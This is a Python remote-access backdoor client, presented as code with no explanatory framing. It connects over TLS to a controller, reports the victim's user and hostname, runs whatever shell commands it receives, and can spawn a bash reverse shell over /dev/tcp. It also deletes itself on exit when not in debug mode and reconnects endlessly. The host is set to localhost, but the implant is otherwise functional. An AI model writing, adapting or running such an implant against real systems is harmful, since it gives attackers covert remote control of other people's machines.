import socket
import subprocess
import os
import ssl
import time
import struct
import sys
import signal

DEBUG = True  # If False, script will erase itself on exit

try:
    import pwd
except ImportError:
    import getpass

    pwd = None


def emergency_exit():
    print('Exiting')
    if not DEBUG:
        subprocess.Popen("python3 -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
    sys.exit(0)


def register_signals():
    signal.signal(signal.SIGINT, emergency_exit)
    signal.signal(signal.SIGTERM, emergency_exit)


def get_current_user():
    if pwd:
        return pwd.getpwuid(os.geteuid()).pw_name
    else:
        return getpass.getuser()


def connect():
    global host
    global port
    global sock

    sock = ssl.wrap_socket(sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                           ca_certs='server.crt',
                           cert_reqs=ssl.CERT_REQUIRED)

    host = 'localhost'
    port = 30481

    print('Connecting to {}:{}'.format(host, port))
    sock.connect((host, port))
    print('Connection established')
    sock.send('{}@{}'.format(get_current_user(), socket.gethostname()).encode())


def receive():
    request = sock.recv(2048).decode()
    if request == 'kill_me_baby':
        sock.close()
        return
    elif request[:5] == 'blank':
        answer = os.getcwd().encode()
    elif request[:5] == 'shell':
        if request[6:8] == 'cd':
            directory = request[9:]
            print(directory)
            try:
                os.chdir(directory.strip())
            except Exception as e:
                answer = "Error! Could not change directory: {}\n".format(e).encode()
            else:
                answer = 'Directory changed to {}'.format(directory).encode()
        else:
            proc = subprocess.Popen(
                request[6:],
                shell=True,
                stdout=subprocess.PIPE,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            answer = proc.stdout.read() + proc.stderr.read()
    elif request[:9] == 'rev_shell':
        rev_port = int(request[10:])
        print(rev_port)
        command = 'screen -dm bash -c "/bin/bash -i >& /dev/tcp/localhost/1337 0>&1"'
        os.system(command)
        answer = b'Reverse shell started'
    else:
        answer = b'No valid command provided'

    send(answer)


def send(string):
    sock.send(struct.pack('>I', len(string)) + string)
    receive()


while True:
    try:
        connect()
        receive()
        sock.close()
    except BaseException:
        time.sleep(15)
